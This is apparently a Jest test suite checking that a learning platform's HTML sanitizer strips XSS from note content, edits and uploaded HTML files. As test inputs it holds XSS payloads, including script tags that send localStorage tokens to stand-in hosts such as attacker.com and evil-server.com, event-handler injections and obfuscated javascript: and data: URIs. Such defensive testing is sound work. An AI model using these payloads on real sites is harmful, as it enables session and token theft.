const request = require('supertest');
const app = require('../server');
const Note = require('../models/Note');
const User = require('../models/User');
const { sanitizeNoteHtml, isDangerousUri } = require('../utils/htmlSanitizer');

require('./setup');

describe('SEC-04: Note Content HTML XSS Protection & Iframe Sandbox Suite', () => {
    let trainerToken;
    let trainerId;
    let studentToken;

    beforeAll(async () => {
        const trainerUser = await User.create({
            name: 'Trainer XSS Tester',
            email: `trainer_xss_${Date.now()}@test.com`,
            password: 'TrainerPassword123!',
            isEmailVerified: true,
            role: 'trainer',
        });
        trainerToken = trainerUser.getSignedJwtToken();
        trainerId = trainerUser.id;

        const studentUser = await User.create({
            name: 'Student XSS Viewer',
            email: `student_xss_${Date.now()}@test.com`,
            password: 'StudentPassword123!',
            isEmailVerified: true,
            role: 'student',
        });
        studentToken = studentUser.getSignedJwtToken();
    });

    describe('1. htmlSanitizer Unit Tests', () => {
        test('preserves legitimate rich-text formatting (paragraphs, headings, lists, bold, tables, links)', () => {
            const rawHtml = `
                <h1>German Verbs Overview</h1>
                <p>Welcome to <strong>German A1</strong>. Here is a table:</p>
                <table>
                    <thead><tr><th>Verb</th><th>Meaning</th></tr></thead>
                    <tbody><tr><td>Sein</td><td>To be</td></tr></tbody>
                </table>
                <ul>
                    <li><a href="https://dolphincoder.com/notes/verbs">Study Verbs</a></li>
                    <li><em>Regular conjugations</em></li>
                </ul>
                <img src="/uploads/pages/verbs.png" alt="Verbs chart" />
            `;
            const clean = sanitizeNoteHtml(rawHtml);
            expect(clean).toContain('<h1>German Verbs Overview</h1>');
            expect(clean).toContain('<strong>German A1</strong>');
            expect(clean).toContain('<table>');
            expect(clean).toContain('href="https://dolphincoder.com/notes/verbs"');
            expect(clean).toContain('alt="Verbs chart"');
        });

        test('detects and strips <script> tags from HTML content', () => {
            const maliciousHtml = `
                <p>Normal Content</p>
                <script type="text/javascript">
                    fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
                </script>
                <p>Closing paragraph</p>
            `;
            const clean = sanitizeNoteHtml(maliciousHtml);
            expect(clean).not.toContain('<script');
            expect(clean).not.toContain('attacker.com');
            expect(clean).not.toContain('localStorage');
            expect(clean).toContain('Normal Content');
            expect(clean).toContain('Closing paragraph');
        });

        test('detects and strips inline event handlers (onerror, onload, onclick, onmouseover)', () => {
            const maliciousHtml = `
                <img src="invalid-img.png" onerror="alert('xss-onerror')" />
                <p onclick="alert('xss-click')" onmouseover="steal()">Click here</p>
                <body onload="initExploit()">Hello</body>
            `;
            const clean = sanitizeNoteHtml(maliciousHtml);
            expect(clean).not.toContain('onerror');
            expect(clean).not.toContain('onclick');
            expect(clean).not.toContain('onmouseover');
            expect(clean).not.toContain('onload');
            expect(clean).not.toContain('xss-onerror');
            expect(clean).toContain('<img src="invalid-img.png"');
            expect(clean).toContain('Click here');
        });

        test('detects and strips javascript: and data:text/html pseudo-protocols from links', () => {
            const maliciousHtml = `
                <a href="javascript:alert(document.cookie)">Malicious Link</a>
                <a href="jav&#x09;ascript:alert('obfuscated')">Obfuscated Link</a>
                <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI</a>
                <a href="https://dolphincoder.com">Legitimate Link</a>
            `;
            const clean = sanitizeNoteHtml(maliciousHtml);
            expect(clean).not.toContain('javascript:alert');
            expect(clean).not.toContain('data:text/html');
            expect(clean).toContain('href="https://dolphincoder.com"');
            expect(clean).toContain('Legitimate Link');
        });

        test('strips dangerous embedding tags (<foreignObject>, <iframe>, <object>, <embed>, <applet>)', () => {
            const maliciousHtml = `
                <iframe src="https://evil.com/phishing"></iframe>
                <object data="exploit.swf"></object>
                <embed src="exploit.pdf"></embed>
                <foreignObject><script>alert(1)</script></foreignObject>
            `;
            const clean = sanitizeNoteHtml(maliciousHtml);
            expect(clean).not.toContain('<iframe');
            expect(clean).not.toContain('<object');
            expect(clean).not.toContain('<embed');
            expect(clean).not.toContain('<foreignObject');
        });

        test('isDangerousUri accurately identifies executable schemes', () => {
            expect(isDangerousUri('javascript:alert(1)')).toBe(true);
            expect(isDangerousUri('JAVASCRIPT:alert(1)')).toBe(true);
            expect(isDangerousUri('java\nscript:alert(1)')).toBe(true);
            expect(isDangerousUri('&#106;avascript:alert(1)')).toBe(true);
            expect(isDangerousUri('vbscript:msgbox(1)')).toBe(true);
            expect(isDangerousUri('data:text/html;base64,PHNjcmlwdD4=')).toBe(true);
            expect(isDangerousUri('https://dolphincoder.com/notes')).toBe(false);
            expect(isDangerousUri('/uploads/pages/test.png')).toBe(false);
        });
    });

    describe('2. POST /api/notes & PUT /api/notes/:id Endpoint Sanitization', () => {
        let createdNoteId;

        test('POST /api/notes sanitizes malicious script tags upon creation', async () => {
            const payload = {
                title: 'Security Note Test',
                content: '<p>Legitimate Intro</p><script>alert("XSS Payload")</script><p>Legitimate Outro</p>',
                contentType: 'richtext',
                tags: ['security', 'test'],
            };

            const res = await request(app)
                .post('/api/notes')
                .set('Authorization', `Bearer ${trainerToken}`)
                .send(payload);

            expect(res.status).toBe(201);
            expect(res.body.success).toBe(true);
            expect(res.body.note.content).not.toContain('<script');
            expect(res.body.note.content).toContain('Legitimate Intro');
            expect(res.body.note.content).toContain('Legitimate Outro');

            createdNoteId = res.body.note.id;

            // Confirm database record has sanitized content
            const dbNote = await Note.findByPk(createdNoteId);
            expect(dbNote.content).not.toContain('<script');
            expect(dbNote.content).toContain('Legitimate Intro');
        });

        test('PUT /api/notes/:id sanitizes malicious event handlers upon update', async () => {
            const updatePayload = {
                content: '<p>Updated Content</p><img src="x" onerror="stealTokens()" />',
            };

            const res = await request(app)
                .put(`/api/notes/${createdNoteId}`)
                .set('Authorization', `Bearer ${trainerToken}`)
                .send(updatePayload);

            expect([200, 201]).toContain(res.status);
            expect(res.body.success).toBe(true);
            expect(res.body.note.content).not.toContain('onerror');
            expect(res.body.note.content).not.toContain('stealTokens');
            expect(res.body.note.content).toContain('Updated Content');

            const dbNote = await Note.findByPk(createdNoteId);
            expect(dbNote.content).not.toContain('onerror');
        });
    });

    describe('3. POST /api/notes/upload File Upload Sanitization', () => {
        test('sanitizes HTML file uploads containing XSS payloads', async () => {
            const maliciousFileHtml = `
                <!DOCTYPE html>
                <html>
                <body>
                    <h2>Slide 1: German Grammar</h2>
                    <p>Some notes content</p>
                    <script>
                        fetch('https://evil-server.com/log?t=' + localStorage.getItem('token'));
                    </script>
                    <a href="javascript:alert('pwned')">Click here</a>
                </body>
                </html>
            `;

            const res = await request(app)
                .post('/api/notes/upload')
                .set('Authorization', `Bearer ${trainerToken}`)
                .field('title', 'Imported HTML Slides')
                .attach('file', Buffer.from(maliciousFileHtml), 'slides.html');

            expect([200, 201]).toContain(res.status);
            expect(res.body.success).toBe(true);
            expect(res.body.note.content).not.toContain('<script');
            expect(res.body.note.content).not.toContain('evil-server.com');
            expect(res.body.note.content).not.toContain('javascript:alert');
            expect(res.body.note.content).toContain('Slide 1: German Grammar');

            // Cleanup note
            await Note.destroy({ where: { id: res.body.note.id } });
        });
    });
});
